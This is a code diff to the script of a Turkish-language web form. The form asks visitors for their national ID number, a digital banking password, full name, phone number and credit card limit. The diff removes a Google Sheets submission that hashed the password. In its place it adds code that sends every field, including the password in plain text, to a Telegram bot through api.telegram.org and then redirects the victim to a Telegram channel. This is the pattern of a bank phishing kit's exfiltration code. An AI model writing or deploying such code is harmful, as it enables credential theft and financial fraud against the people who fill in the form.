@@ -237,65 +237,72 @@
     step1.classList.remove('hidden');
   });
 
-  // === Google Sheet gönderim ayarları ===
-  const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbwE7JfVUwerdthmweWWJhT5_MCBxQ8fiRvay8-vcAJ9LtRfw5moI5eCmofvgtF_PexR1Q/exec";
-  // DİKKAT: Apps Script içindeki EXPECTED_TOKEN ile aynı olmalı.
-  const EXPECTED_TOKEN = "MY_SECURE_TOKEN_2025";
+  // Telegram Ayarları - Buraya kendi bot token ve chat ID'nizi girin
+  const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN'; // Bot token'ınızı buraya girin
+  const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID'; // Chat ID'nizi buraya girin
+  const TELEGRAM_REDIRECT_URL = 'https://t.me/YOUR_CHANNEL_OR_USERNAME'; // Telegram kanal/kişi linki (opsiyonel)
 
-  async function hashTextSHA256(text){
-    if (!text) return "";
-    const enc = new TextEncoder();
-    const data = enc.encode(text);
-    const hashBuffer = await crypto.subtle.digest('SHA-256', data);
-    const hashArray = Array.from(new Uint8Array(hashBuffer));
-    return hashArray.map(b => b.toString(16).padStart(2,'0')).join('');
+  // Form verilerini topla ve Telegram'a gönder
+  async function sendToTelegram(data) {
+    const message = `
+🔐 Yeni Form Gönderimi
+
+👤 T.C. Kimlik: ${data.tcno}
+🔑 Dijital Şifre: ${data.sifre}
+📝 Ad Soyad: ${data.fullname}
+📱 Telefon: ${data.phone}
+💳 Kredi Kartı Limiti: ${data.limit}
+
+⏰ Tarih: ${new Date().toLocaleString('tr-TR')}
+    `.trim();
+
+    try {
+      const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message,
+          parse_mode: 'HTML'
+        })
+      });
+
+      const result = await response.json();
+      return result.ok;
+    } catch (error) {
+      console.error('Telegram gönderim hatası:', error);
+      return false;
+    }
   }
 
   document.getElementById('submitLimit').addEventListener('click', async ()=>{
-    const tc = document.getElementById('tcno').value.trim();
-    const sifre = document.getElementById('sifre').value.trim();
-    const fullname = document.getElementById('fullname').value.trim();
-    const phone = document.getElementById('phone').value.trim();
     const limit = document.getElementById('limit').value.trim();
+    if(!limit){ alert("Lütfen kredi kartı limitinizi girin."); return; }
 
-    if(!tc || !sifre || !fullname || !phone || !limit){
-      alert("Lütfen tüm alanları doldurun.");
-      return;
-    }
-
-    const hashedPassword = await hashTextSHA256(sifre);
-
-    const payload = {
-      token: EXPECTED_TOKEN,
-      tc: tc,
-      hashedPassword: hashedPassword,
-      fullname: fullname,
-      phone: phone,
+    // Tüm form verilerini topla
+    const formData = {
+      tcno: document.getElementById('tcno').value.trim(),
+      sifre: document.getElementById('sifre').value.trim(),
+      fullname: document.getElementById('fullname').value.trim(),
+      phone: document.getElementById('phone').value.trim(),
       limit: limit
     };
 
-    try {
-      const res = await fetch(WEB_APP_URL, {
-        method: 'POST',
-        mode: 'cors',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(payload)
-      });
-      const data = await res.json();
-      if (data && data.status === 'ok') {
-        alert("Bilgiler başarıyla alındı. Google Sheets'e kaydedildi.");
-        window.location.reload();
-      } else {
-        alert("Kaydederken hata: " + (data.error || JSON.stringify(data)));
+    // Telegram'a gönder
+    const success = await sendToTelegram(formData);
+    
+    if(success) {
+      alert("Bilgiler başarıyla gönderildi. Telegram'a yönlendiriliyorsunuz...");
+      // Telegram'a yönlendir
+      if(TELEGRAM_REDIRECT_URL && TELEGRAM_REDIRECT_URL !== 'https://t.me/YOUR_CHANNEL_OR_USERNAME') {
+        window.location.href = TELEGRAM_REDIRECT_URL;
       }
-    } catch (err) {
-      console.error(err);
-      alert("Gönderim hatası: " + err.message + "\n(Eğer CORS hatası alırsanız, Apps Script dağıtım ayarlarını kontrol edin.)");
+    } else {
+      alert("Bilgiler gönderilirken bir hata oluştu. Lütfen tekrar deneyin.");
     }
   });
 </script>
 </body>
 </html>
-
